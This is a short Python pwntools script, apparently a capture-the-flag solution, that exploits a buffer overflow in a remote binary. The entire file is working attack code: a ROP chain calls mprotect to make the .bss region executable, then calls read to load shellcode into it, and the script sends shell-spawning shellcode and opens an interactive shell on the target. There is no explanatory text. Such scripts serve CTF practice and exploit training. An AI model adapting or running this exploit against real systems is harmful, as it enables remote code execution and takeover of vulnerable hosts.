from pwn import *
from struct import pack

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27425)
mprotect=0x0806D870
bss=0x080EB000
main=0x08048E24
pop=0x08048913
read=0x0806CD50

payload=0x20*b'a'+p32(mprotect)+p32(pop)+p32(bss)+p32(0x1000)+p32(7)+p32(read)+p32(pop)+p32(0)+p32(bss)+p32(0x1000)+p32(bss)
sh.sendline(payload)
shellcode=asm(shellcraft.sh())
sh.sendline(shellcode)
sh.interactive()
